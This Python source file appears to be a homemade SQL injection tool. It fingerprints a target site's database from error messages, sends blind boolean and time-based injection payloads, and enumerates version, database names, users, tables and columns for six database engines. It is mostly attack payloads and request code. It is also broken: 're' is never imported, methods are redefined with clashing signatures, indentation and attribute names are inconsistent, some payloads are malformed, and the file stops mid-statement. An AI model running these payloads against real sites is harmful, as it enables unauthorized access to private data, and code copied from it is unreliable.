import argparse, asyncio, aiohttp, time
from bs4 import BeautifulSoup as BS

class SQLInjectionScanner:

    def __init__(self, target_url, database_types):
        self.target_url = target_url
        self.database_types = database_types
        self.session = aiohttp.ClientSession()
        self.detected_db_type = None
        self.db_dict = {
            "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'],
            "PostGre": ['PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string', 'column not found', 'relation not found', 'function not found'],
            "Microsoft_SQL": ['Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark', 'Incorrect syntax near', 'SQL Server error', 'The data types ntext and nvarchar are incompatible'],
            "Oracle": ['ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression', 'missing keyword', 'missing right parenthesis', 'not a valid month'],
            "Advantage_Database": ['AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'],
            "Firebird": ['Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string', 'Invalid token']
        }
        self.db_name = None
        self.current_user = None

    async def detect_database_type(self, response_data):
        for db, identifiers in self.db_dict.items():
            for dbid in identifiers:
                if dbid in response_data:
                    return db
        return None

    async def boolean_based_detection(self, database_type):
        payload = f"{database_type}' OR 1=1 --"
        return await self.perform_injection_detection(payload)

    async def time_based_detection(self, database_type):
        payload = f"{database_type}' OR IF(1=1, BENCHMARK(5000000, SHA1('test')), 0) --"
        return await self.perform_injection_detection(payload)

    async def perform_injection_detection(self, payload):
        url = f"{self.target_url}/{payload}"

        try:
            start_time = time.time()
            async with self.session.get(url) as response:
                elapsed_time = time.time() - start_time
                data = await response.text()

                dynamic_unique_string = self.extract_dynamic_unique_string(data)

                if dynamic_unique_string:
                    print(f"Found dynamic unique string: {dynamic_unique_string}")
                    return True

                if elapsed_time > 5:
                    return True

        except aiohttp.ClientError as e:
            print('Error during injection detection: ', e)

        return False

    def extract_dynamic_unique_string(self, response_data):
        pattern = re.compile(r'START_STRING(.*?)END_STRING', re.DOTALL)

        match = pattern.search(response_data)

        if match:
            return match.group(1)

        return None
    async def scan_blind_sql_injection(self, database_type):
        boolean_injection_detected = await self.boolean_based_detection(database_type)

        time_injection_detected = await self.time_based_detection(database_type)

        return boolean_injection_detected or time_injection_detected

    async def scan_database_type(self):
        for database_type in self.database_types:
            for suffix in ["'", '"', ';', ")", "')", '")', '*', '";']:
                url = f"{self.target_url}/{database_type}{suffix}"

                try:
                    async with self.session.get(url) as response:
                        data = await response.text()
                        db_type = await self.detect_database_type(data)

                        if db_type:
                            print(f"Database type: {db_type}")
                            self.detected_db_type = db_type
                            break

                except Exception as e:
                    print('Error: ', e)
                    print('Database type: Unknown')
                    break

            if self.detected_db_type:
                injection_detected = await self.scan_blind_sql_injection(self.detected_db_type)
                if injection_detected:
                    print(f"Blind SQL Injection Detected for {self.detected_db_type}!")

        return self.detected_db_type

    async def get_version(self):
        print(f"Getting version for {self.database_type} database...")

        if self.database_type == "MySQL":
            await self.perform_mysql_get_version()
        elif self.database_type == "PostGre":
            await self.perform_postgre_get_version()
        elif self.database_type == "Microsoft_SQL":
            await self.perform_microsoftsql_get_version()
        elif self.database_type == "Oracle":
            await self.perform_oracle_get_version()
        elif self.database_type == "Advantage_Database":
            await self.perform_advantage_get_version()
        elif self.database_type == "Firebird":
            await self.perform_firebird_get_version()
        else:
            print(f"Unsupported database type: {self.database_type}")

    async def perform_mysql_get_version(self):
        print("MySQL: Retrieving Database version...")
        for query in [
            "SELECT @@version; --",
            "SELECT VERSION(); --",
            "SELECT @@GLOBAL.VERSION; --",
            "SELECT @@VERSION; --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def perform_postgre_get_version(self):
        print("PostgreSQL: Retrieving Database version...")
        for query in [
            "SELECT version(); --",
            "SELECT current_setting('server_version'); --",
            "SELECT setting FROM pg_settings WHERE name = 'server_version'; --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def perform_microsoftsql_get_version(self):
        print("Microsoft SQL Server: Retrieving Database version...")
        for query in [
            "SELECT @@VERSION; --",
            "SELECT SERVERPROPERTY('productversion'); --",
            "SELECT SERVERPROPERTY('productlevel'); --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def perform_oracle_get_version(self):
        print("Oracle: Retrieving Database version...")
        for query in [
            "SELECT banner FROM v$version; --",
            "SELECT * FROM v$version; --",
            "SELECT version FROM v$instance; --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def perform_advantage_get_version(self):
        print("Advantage Database: Retrieving Database version...")
        for query in [
            "SELECT AdsVersion(); --",
            "SELECT AdsVersion(); --",
            "SELECT AdsExtendedReader('SELECT AdsVersion()', AdsConnection()); --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def perform_firebird_get_version(self):
        print("Firebird: Retrieving Database version...")
        for query in [
            "SELECT @@VERSION; --",
            "SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database; --",
            "SELECT rdb$get_context('SYSTEM', 'ODS_VERSION') FROM rdb$database; --",
        ]:
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.get(full_url) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing GET request for query '{query}': {e}")

    async def get_database_name(self):
        print(f"Getting database name for {self.database_type} database...")

        if self.database_type == "MySQL":
            await self.perform_mysql_get_database_name()
        elif self.database_type == "PostGre":
            await self.perform_postgre_get_database_name()
        elif self.database_type == "Microsoft_SQL":
            await self.perform_microsoftsql_get_database_name()
        elif self.database_type == "Oracle":
            await self.perform_oracle_get_database_name()
        elif self.database_type == "Advantage_Database":
            await self.perform_advantage_get_database_name()
        elif self.database_type == "Firebird":
            await self.perform_firebird_get_database_name()
        else:
            print(f"Unsupported database type: {self.database_type}")

    async def perform_mysql_get_database_name(self):
        print("MySQL: Retrieving Database name...")
        for query in [
            "SELECT DATABASE(); --", 
            "SELECT SCHEMA_NAME FROM information_schema.schemata; --",  
            "SELECT DISTINCT(db) FROM mysql.db; --",  
            "SELECT GROUP_CONCAT(DISTINCT db) FROM mysql.db; --",  
            "SHOW DATABASES; --", 
            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.tables; --",  
            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.views; --", 
            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.columns; --",  
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")
    
    async def perform_postgre_get_database_name(self):
        print("PostgreSQL: Retrieving Database name...")
        for query in [
            "SELECT current_database(); --", 
            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  
            "SELECT DISTINCT table_catalog FROM information_schema.views; --", 
            "SELECT DISTINCT table_catalog FROM information_schema.columns; --", 
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")

    async def perform_microsoftsql_get_database_name(self):
        print("Microsoft SQL Server: Retrieving Database name...")
        for query in [
            "SELECT DB_NAME(); --",  
            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  
            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  
            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")

    async def perform_oracle_get_database_name(self):
        print("Oracle: Retrieving Database name...")
        for query in [
            "SELECT DISTINCT tablespace_name FROM user_tables; --", 
            "SELECT DISTINCT tablespace_name FROM user_views; --",  
            "SELECT DISTINCT tablespace_name FROM user_tab_columns; --",  
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")

    async def perform_advantage_get_database_name(self):
        print("Advantage Database: Retrieving Database name...")
        for query in [
            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageTable WHERE AdsDatabaseName IS NOT NULL; --",
            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageColumn WHERE AdsDatabaseName IS NOT NULL; --",  
            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageView WHERE AdsDatabaseName IS NOT NULL; --", 
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")

    async def perform_firebird_get_database_name(self):
        print("Firebird: Retrieving Database name...")
        for query in [
            "SELECT DISTINCT rdb$database_name FROM rdb$database; --", 
            "SHOW DATABASE; --", 
            "SELECT DISTINCT current_database FROM rdb$database; --", 
        ]:
            post_data = {}
            full_url = f'{self.target_url}+{query}'

            try:
                async with self.session.post(full_url, data=post_data) as response:
                    result = await response.text()
                    print(result)
            except Exception as e:
                print(f"Error performing POST request for query '{query}': {e}")

    async def get_current_user(self, dbname):
        print(f"Getting current user for {self.db_type} database...")

        if self.db_type == "MySQL":
            await self.perform_mysql_get_current_user(dbname)
        elif self.db_type == "PostGre":
            await self.perform_postgre_get_current_user(dbname)
        elif self.db_type == "Microsoft_SQL":
            await self.perform_microsoftsql_get_current_user(dbname)
        elif self.db_type == "Oracle":
            await self.perform_oracle_get_current_user(dbname)
        elif self.db_type == "Advantage_Database":
            await self.perform_advantage_get_current_user(dbname)
        elif self.db_type == "Firebird":
            await self.perform_firebird_get_current_user(dbname)
        else:
            print(f"Unsupported database type: {self.db_type}")

    async def perform_microsoftsql_get_current_user(self):
        print("Microsoft SQL Server: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            for query in [
                f"1' UNION SELECT null, SYSTEM_USER, null; --",
                f"1' OR 1=CONVERT(int, (SELECT SYSTEM_USER)); --",
                f"1' OR IF(1=1, SYSTEM_USER, 0) --",
                f"1' OR 1=CONVERT(int, (SELECT CURRENT_USER)); --",
                f"1' OR SUBSTRING((SELECT CURRENT_USER), 1, 1) = 'a'; --",
                f"1' OR IF(1=1, (SELECT CURRENT_USER LIKE 'a%'), 0); --",
            ]:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"Microsoft SQL Server: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"Microsoft SQL Server: Error performing POST request for query '{query}': {e}")

    async def perform_firebird_get_current_user(self):
        print("Firebird: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            for query in [
                f"1' OR 1=CONVERT(int, (SELECT CURRENT_USER FROM rdb$database)); --",
                f"1' OR 1=CONVERT(int, (SELECT CURRENT_ROLE FROM rdb$database)); --",
                f"1' OR SUBSTRING((SELECT CURRENT_USER FROM rdb$database), 1, 1) = 'a'; --",
                f"1' OR IF(1=1, (SELECT CURRENT_USER FROM rdb$database) LIKE 'a%', 0); --",
            ]:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"Firebird: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"Firebird: Error performing POST request for query '{query}': {e}")

    async def perform_advantage_get_current_user(self):
        print("Advantage Database: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            for query in [
                f"1' OR 1=CONVERT(int, (SELECT current_user FROM system.iota)); --",
                f"1' OR 1=CONVERT(int, (SELECT user FROM system.iota)); --",
                f"1' OR 1=CONVERT(int, (SELECT name FROM system.iota)); --",
                f"1' OR 1=CONVERT(int, (SELECT CURRENT_CONNECTION FROM system.iota)); --",
                f"1' OR SUBSTRING((SELECT user FROM system.iota), 1, 1) = 'a'; --",
                f"1' OR IF(1=1, (SELECT user FROM system.iota) LIKE 'a%', 0); --",
            ]:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"Advantage Database: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"Advantage Database: Error performing POST request for query '{query}': {e}")

    async def perform_oracle_get_current_user(self):
        print("Oracle: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            for query in [
                f"1' OR 1=CONVERT(int, (SELECT user FROM dual)); --",
                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'current_user') FROM dual)); --",
                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'session_user') FROM dual)); --",
                f"1' OR 1=CONVERT(int, (SELECT sys_context('userenv', 'os_user') FROM dual)); --",
                f"1' OR SUBSTR((SELECT user FROM dual), 1, 1) = 'a'; --",
                f"1' OR IF(1=1, (SELECT user FROM dual) LIKE 'a%', 0); --",
            ]:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"Oracle: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"Oracle: Error performing POST request for query '{query}': {e}")

    async def perform_postgre_get_current_user(self):
        print("PostgreSQL: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            for query in [
                f"1' UNION SELECT null, current_user, null; --",
                f"1' OR 1=CONVERT(int, (SELECT current_user)); --",
                f"1' OR IF(1=1, current_user, 0) --",
                f"1' OR 1=CONVERT(int, (SELECT current_database())); --",
                f"1' OR 1=CONVERT(int, (SELECT current_schema())); --",
                f"1' OR SUBSTRING(current_user, 1, 1) = 'a'; --",
                f"1' OR IF(1=1, (SELECT current_user LIKE 'a%'), 0); --",
            ]:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"PostgreSQL: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"PostgreSQL: Error performing POST request for query '{query}': {e}")

    async def perform_mysql_get_current_user(self, dbname):
        print("MySQL: Retrieving current user...")
        async with aiohttp.ClientSession() as session:
            unique_responses = set()

            queries = [
                f"1' OR 1=CONVERT(int, (SELECT {func}() FROM {dbname})); --" for func in ['user', 'current_user', 'system_user', 'host_name', '@@session.user', '@@user']
            ] + [
                f"1' UNION SELECT null, {func}(), null FROM {dbname}; --" for func in ['user', 'system_user', 'current_user', 'session_user', '@@user', '@@session.user', 'host_name', 'system_user FROM mysql.user', 'user FROM mysql.user WHERE user NOT LIKE \'root\'', 'user FROM information_schema.tables WHERE table_schema != \'mysql\'']
            ] + [
                f"1' OR IF(1=1, {func}(), 0) FROM {dbname} --" for func in ['user', 'current_user', 'system_user', '@@session.user']
            ] + [
                f"1' OR 1=CONVERT(int, (SELECT {func} FROM {dbname})); --" for func in ['@@version', 'user', 'current_user', 'system_user', 'host_name', '@@session.user']
            ] + [
                f"1' OR SUBSTRING({func}(), 1, 1) = 'a' FROM {dbname}; --" for func in ['user', 'current_user LIKE \'a%\'']
            ]

            for query in queries:
                post_data = {}
                full_url = f'{self.target_url}+{query}'

                try:
                    async with session.post(full_url, data=post_data) as response:
                        result = await response.text()
                        soup = BS(result, 'html.parser')
                        current_user = soup.find('div', class_='current-user').text

                        if current_user not in unique_responses:
                            unique_responses.add(current_user)
                            print(f"MySQL: Retrieving current user response for query '{query}': {current_user}")
                except Exception as e:
                    print(f"MySQL: Error performing POST request for query '{query}': {e}")
    async def get_database_name(self, dbname):
        print(f"Getting database name for {self.database_type} database...")

        if self.database_type == "MySQL":
            await self.perform_mysql_get_database_name(dbname)
        elif self.database_type == "PostGre":
            await self.perform_postgre_get_database_name(dbname)
        elif self.database_type == "Microsoft_SQL":
            await self.perform_microsoftsql_get_database_name(dbname)
        elif self.database_type == "Oracle":
            await self.perform_oracle_get_database_name(dbname)
        elif self.database_type == "Advantage_Database":
            await self.perform_advantage_get_database_name(dbname)
        elif self.database_type == "Firebird":
            await self.perform_firebird_get_database_name(dbname)
        else:
            print(f"Unsupported database type: {self.database_type}")

    async def perform_mysql_get_database_name(self, dbname):
        print("MySQL: Retrieving Database name...")

        for query in [
            f"SELECT DATABASE() FROM {dbname}; --",
            f"SELECT SCHEMA_NAME FROM {dbname}.information_schema.schemata; --",
            f"SELECT DISTINCT(db) FROM {dbname}.mysql.db; --",
            f"SELECT GROUP_CONCAT(DISTINCT db) FROM {dbname}.mysql.db; --",
            f"SHOW DATABASES FROM {dbname}; --",
            f"SELECT DISTINCT TABLE_SCHEMA FROM {dbname}.information_schema.tables; --",
            f"SELECT DISTINCT TABLE_SCHEMA FROM {dbname}.information_schema.views; --",
            f"SELECT DISTINCT TABLE_SCHEMA FROM {dbname}.information_schema.columns; --",
        ]:
            await self.execute_mysql_query(dbname, query)

    async def execute_mysql_query(self, dbname, query):
        print(f"Executing query: {query}")

        link = f"{self.target_url}+{query}"
        try:
            async with self.session.get(link) as response:
                data = await response.text()
                await self.extract_database_name(data)
        except aiohttp.ClientError as e:
            print(f"Error performing GET request for query '{query}': {e}")

    async def perform_postgre_get_database_name(self, dbname):
        print("PostgreSQL: Retrieving Database name...")
        for query in [
            f"SELECT current_database() FROM {dbname}; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.tables; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.views; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.columns; --",
        ]:
            await self.execute_postgre_query(dbname, query)

    async def execute_postgre_query(self, dbname, query):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_database_name(result)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def perform_microsoftsql_get_database_name(self, dbname):
        print("Microsoft SQL Server: Retrieving Database name...")
        for query in [
            f"SELECT DB_NAME() FROM {dbname}; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.tables; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.views; --",
            f"SELECT DISTINCT table_catalog FROM {dbname}.information_schema.columns; --",
        ]:
            await self.execute_microsoftsql_query(dbname, query)

    async def execute_microsoftsql_query(self, dbname, query):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_database_name(result)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def perform_oracle_get_database_name(self, dbname):
        print("Oracle: Retrieving Database name...")
        for query in [
            f"SELECT DISTINCT tablespace_name FROM {dbname}.user_tables; --",
            f"SELECT DISTINCT tablespace_name FROM {dbname}.user_views; --",
            f"SELECT DISTINCT tablespace_name FROM {dbname}.user_tab_columns; --",
        ]:
            await self.execute_oracle_query(dbname, query)

    async def execute_oracle_query(self, dbname, query):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_database_name(result)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def perform_advantage_get_database_name(self, dbname):
        print("Advantage Database: Retrieving Database name...")
        for query in [
            f"SELECT DISTINCT AdsDatabaseName FROM {dbname}.INFORMATION_SCHEMA.AdvantageTable WHERE AdsDatabaseName IS NOT NULL; --",
            f"SELECT DISTINCT AdsDatabaseName FROM {dbname}.INFORMATION_SCHEMA.AdvantageColumn WHERE AdsDatabaseName IS NOT NULL; --",
            f"SELECT DISTINCT AdsDatabaseName FROM {dbname}.INFORMATION_SCHEMA.AdvantageView WHERE AdsDatabaseName IS NOT NULL; --",
        ]:
            await self.execute_advantage_query(dbname, query)

    async def execute_advantage_query(self, dbname, query):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_database_name(result)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def perform_firebird_get_database_name(self, dbname):
        print("Firebird: Retrieving Database name...")
        for query in [
            f"SELECT DISTINCT rdb$database_name FROM {dbname}.rdb$database; --",
            f"SHOW DATABASE FROM {dbname}; --",
            f"SELECT DISTINCT current_database FROM {dbname}.rdb$database; --",
        ]:
            await self.execute_firebird_query(dbname, query)

    async def execute_firebird_query(self, dbname, query):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_database_name(result)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def extract_database_name(self, data):
        print("Extracting database name...")
        str_num = str(data).find('error:')

        if str_num == -1:
            print('Access Denied')
        else:
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            print(f"Database name: {str3}")

        async def get_table_names(self, dbname):
        print(f"Getting table names for {self.database_type} database...")
        
        if self.database_type == "MySQL":
            await self.perform_mysql_get_table_names(dbname)
        elif self.database_type == "PostGre":
            await self.perform_postgre_get_table_names(dbname)
        elif self.database_type == "Microsoft_SQL":
            await self.perform_microsoftsql_get_table_names(dbname)
        elif self.database_type == "Oracle":
            await self.perform_oracle_get_table_names(dbname)
        elif self.database_type == "Advantage_Database":
            await self.perform_advantage_get_table_names(dbname)
        elif self.database_type == "Firebird":
            await self.perform_firebird_get_table_names(dbname)
        else:
            print(f"Unsupported database type: {self.database_type}")

    async def perform_mysql_get_table_names(self, dbname):
        print("MySQL: Retrieving Table names...")
        
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
        await self.execute_mysql_query(dbname, query, result_key='Table names')

    async def perform_postgre_get_table_names(self, dbname):
        print("PostgreSQL: Retrieving Table names...")
        
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
        await self.execute_postgre_query(dbname, query, result_key='Table names')

    async def perform_microsoftsql_get_table_names(self, dbname):
        print("Microsoft SQL Server: Retrieving Table names...")
        
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{dbname}'; --"
        await self.execute_microsoftsql_query(dbname, query, result_key='Table names')

    async def perform_oracle_get_table_names(self, dbname):
        print("Oracle: Retrieving Table names...")
        
        query = f"SELECT table_name FROM all_tables WHERE owner = '{dbname}'; --"
        await self.execute_oracle_query(dbname, query, result_key='Table names')

    async def perform_advantage_get_table_names(self, dbname):
        print("Advantage Database: Retrieving Table names...")
        
        query = f"SELECT AdsTableName FROM {dbname}.INFORMATION_SCHEMA.AdvantageTable WHERE AdsTableName IS NOT NULL; --"
        await self.execute_advantage_query(dbname, query, result_key='Table names')

    async def perform_firebird_get_table_names(self, dbname):
        print("Firebird: Retrieving Table names...")
        
        query = f"SELECT rdb$relation_name FROM {dbname}.rdb$relations WHERE rdb$view_blr IS NULL; --"
        await self.execute_firebird_query(dbname, query, result_key='Table names')


    async def execute_mysql_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        link = f"{self.target_url}+{query}"
        try:
            async with self.session.get(link) as response:
                data = await response.text()
                await self.extract_result(data, result_key)
        except aiohttp.ClientError as e:
            print(f"Error performing GET request for query '{query}': {e}")

    async def execute_postgre_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_result(result, result_key)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def execute_microsoftsql_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_result(result, result_key)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def execute_oracle_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_result(result, result_key)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def execute_advantage_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_result(result, result_key)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def execute_firebird_query(self, dbname, query, result_key='Result'):
        print(f"Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                result = await response.text()
                await self.extract_result(result, result_key)
        except Exception as e:
            print(f"Error performing POST request for query '{query}': {e}")

    async def extract_result(self, data, result_key):
        print(f"Extracting {result_key}...")
        str_num = str(data).find('error:')

        if str_num == -1:
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            print(f"{result_key}: {str3}")
        else:
            print('Access Denied')

     async def get_column_names(self, dbname, table_name):
        print(f"Extracting columns for {self.database_type} database and table {table_name}...")

        if self.database_type == "MySQL":
            await self.extract_mysql_column_names(dbname, table_name)
        elif self.database_type == "PostGre":
            await self.extract_postgre_column_names(dbname, table_name)
        elif self.database_type == "Microsoft_SQL":
            await self.extract_microsoftsql_column_names(dbname, table_name)
        elif self.database_type == "Oracle":
            await self.extract_oracle_column_names(dbname, table_name)
        elif self.database_type == "Advantage_Database":
            await self.extract_advantage_column_names(dbname, table_name)
        elif self.database_type == "Firebird":
            await self.extract_firebird_column_names(dbname, table_name)
        else:
            print(f"Unsupported database type: {self.database_type}")

    async def extract_mysql_column_names(self, dbname, table_name):
        print("MySQL: Retrieving Column names...")

        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
        await self.execute_mysql_query(dbname, query, result_key='MySQL Column names')

    async def extract_postgre_column_names(self, dbname, table_name):
        print("PostgreSQL: Retrieving Column names...")

        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
        await self.execute_postgre_query(dbname, query, result_key='PostgreSQL Column names')

    async def extract_microsoftsql_column_names(self, dbname, table_name):
        print("Microsoft SQL Server: Retrieving Column names...")

        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
        await self.execute_microsoftsql_query(dbname, query, result_key='Microsoft SQL Column names')

    async def extract_oracle_column_names(self, dbname, table_name):
        print("Oracle: Retrieving Column names...")

        query = f"SELECT column_name FROM all_tab_columns WHERE owner = '{dbname}' AND table_name = '{table_name}' AND ROWNUM = 1; --"
        await self.execute_oracle_query(dbname, query, result_key='Oracle Column names')

    async def extract_advantage_column_names(self, dbname, table_name):
        print("Advantage Database: Retrieving Column names...")

        query = f"SELECT AdsColumnName FROM {dbname}.INFORMATION_SCHEMA.AdvantageColumn WHERE AdsTableName = '{table_name}' AND AdsColumnName IS NOT NULL; --"
        await self.execute_advantage_query(dbname, query, result_key='Advantage Database Column names')

    async def extract_firebird_column_names(self, dbname, table_name):
        print("Firebird: Retrieving Column names...")

        query = f"SELECT rdb$field_name FROM {dbname}.rdb$relation_fields WHERE rdb$relation_name = '{table_name}' AND rdb$view_blr IS NULL; --"
        await self.execute_firebird_query(dbname, query, result_key='Firebird Column names')

    async def execute_extract_columns_mysql_query(self, dbname, query, result_key):
        print(f"MySQL: Executing query: {query}")

        link = f"{self.target_url}+{query}"
        try:
            async with self.session.get(link) as response:
                data = await response.text()
                print(data)
        except aiohttp.ClientError as e:
